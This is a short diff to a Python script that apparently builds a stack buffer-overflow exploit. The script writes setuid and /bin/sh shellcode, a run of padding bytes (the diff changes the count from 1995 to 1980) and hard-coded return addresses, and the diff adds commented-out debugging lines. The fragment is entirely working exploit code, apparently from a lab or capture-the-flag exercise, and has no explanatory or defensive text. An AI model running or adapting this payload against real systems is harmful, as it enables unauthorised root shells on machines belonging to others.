@@ -7,7 +7,10 @@ bin_sh = (
 
 shellcode = setuid + bin_sh
 sys.stdout.write(shellcode)
-for i in range(1995):
+for i in range(1980):
+    #shellcode += 'a'
     sys.stdout.write("a")
+#shellcode += '\xe8\xb0\xff\xbf\xfc\xb8\xff\xbf'
+#print(len(shellcode))
 sys.stdout.write("\xe8\xb0\xff\xbf")
 sys.stdout.write("\xfc\xb8\xff\xbf")
